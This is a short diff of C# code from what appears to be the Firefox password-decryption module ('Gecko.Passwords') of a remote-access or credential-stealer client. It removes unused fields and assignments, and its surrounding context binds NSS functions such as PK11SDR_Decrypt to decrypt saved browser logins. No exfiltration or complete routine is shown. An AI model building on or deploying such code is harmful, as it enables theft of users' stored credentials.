@@ -31,8 +31,6 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);
 
-        private NssInit NSS_Init;
-
         private NssShutdown NSS_Shutdown;
 
         private Pk11sdrDecrypt PK11SDR_Decrypt;
@@ -40,16 +38,10 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
         private IntPtr NSS3;
         private IntPtr Mozglue;
 
-        private bool _initialized = false;
-        private string _profilePath = "";
-        private string _JSONData = "";
-        private string _sqlitePath = "";
-
         public bool Init(string profilePath, string loginData = "", string signons = "")
         {
             try
             {
-                _profilePath = profilePath;
 
                 if (!string.IsNullOrEmpty(loginData) && !File.Exists(loginData))
                 {
@@ -140,20 +132,8 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
                         {
                             NSS3 = nss.NSS3;
                             Mozglue = nss.Mozglue;
-                            NSS_Init = nss.NSS_Init;
                             PK11SDR_Decrypt = nss.PK11SDR_Decrypt;
                             NSS_Shutdown = nss.NSS_Shutdown;
-                            
-                            _initialized = true;
-                            
-                            if (!string.IsNullOrEmpty(loginData))
-                            {
-                                _JSONData = loginData;
-                            }
-                            if (!string.IsNullOrEmpty(signons))
-                            {
-                                _sqlitePath = signons;
-                            }
                             
                             Debug.WriteLine("NSS initialized successfully");
                             return true;
